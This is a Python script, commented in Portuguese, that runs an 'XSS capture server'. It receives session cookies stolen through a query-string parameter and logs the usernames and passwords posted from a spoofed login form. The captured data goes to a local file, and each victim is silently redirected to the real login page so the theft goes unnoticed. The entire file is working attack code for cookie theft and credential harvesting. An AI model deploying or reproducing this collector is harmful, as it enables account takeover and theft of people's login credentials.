from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote
from datetime import datetime
import sys

LOG_FILE = r"C:\Users\paulo.arruda\Desktop\econometria\credenciais_capturadas.txt"
PORT = 9999
REDIRECT_URL = "http://172.30.1.12/index.php"

class CaptureHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        """Captura cookies/sessão via query string"""
        if "c=" in self.path:
            params = parse_qs(self.path.split("?", 1)[-1])
            cookie = params.get("c", [""])[0]
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip = self.client_address[0]

            print()
            print(f"\033[91m  [{ts}] *** COOKIE/SESSAO CAPTURADO! ***\033[0m")
            print(f"\033[93m  IP:     {ip}\033[0m")
            print(f"\033[93m  Cookie: {cookie}\033[0m")
            print()

            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{ts}] COOKIE | IP: {ip} | Cookie: {cookie}\n")

        # Redireciona vítima de volta ao login real
        self.send_response(302)
        self.send_header("Location", REDIRECT_URL)
        self.end_headers()

    def do_POST(self):
        """Captura credenciais do formulário"""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        params = parse_qs(body)

        usuario = params.get("loginstring", ["(vazio)"])[0]
        senha = params.get("user_pw", ["(vazio)"])[0]
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = self.client_address[0]

        # Mostrar na tela com cores
        print()
        print(f"\033[91m  [{ts}] ========= CREDENCIAIS CAPTURADAS! =========\033[0m")
        print(f"\033[97m  IP Origem:  {ip}\033[0m")
        print(f"\033[93m  Usuário:    {usuario}\033[0m")
        print(f"\033[93m  Senha:      {senha}\033[0m")
        print(f"\033[91m  =============================================\033[0m")
        print()

        # Salvar em arquivo
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] LOGIN  | IP: {ip} | Usuario: {usuario} | Senha: {senha}\n")

        # Redireciona vítima de volta ao login real (não percebe nada)
        self.send_response(302)
        self.send_header("Location", REDIRECT_URL)
        self.end_headers()

    def log_message(self, format, *args):
        """Silencia logs padrão do HTTP server"""
        pass


if __name__ == "__main__":
    print()
    print("\033[96m  =========================================")
    print("   SERVIDOR DE CAPTURA XSS - ATIVO")
    print("  =========================================\033[0m")
    print()
    print(f"\033[93m  Escutando em:  0.0.0.0:{PORT}")
    print(f"  Seu IP:        172.25.176.1")
    print(f"  Log salvo em:  {LOG_FILE}\033[0m")
    print()
    print("\033[92m  Aguardando credenciais...\033[0m")
    print()
    
    sys.stdout.flush()

    server = HTTPServer(("0.0.0.0", PORT), CaptureHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Servidor encerrado.")
        server.server_close()
